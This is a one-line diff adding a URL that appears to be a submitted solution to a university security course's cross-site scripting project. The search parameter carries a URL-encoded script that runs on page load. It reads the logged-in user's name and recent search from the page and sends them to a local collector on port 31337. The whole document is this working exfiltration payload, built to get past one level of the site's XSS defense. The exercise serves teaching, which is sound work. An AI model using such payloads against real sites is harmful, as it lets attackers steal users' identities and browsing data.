@@ -1,0 +1,1 @@
+https://comp427.rice.edu/proj2/search?xssdefense=3&q=%3Cscript%3Ewindow.onload%20=%20function%28%29%20{$.ajax%28{url:%60https://localhost:31337/username=%60.concat%28document.getElementById%28%60logged-in-user%60%29.innerHTML%29.concat%28%60%26last_search:%60%29.concat%28document.getElementsByClassName%28%60list-group-item%60%29[1].text%29,%20type:%60GET%60}%29}%3C/script%3E
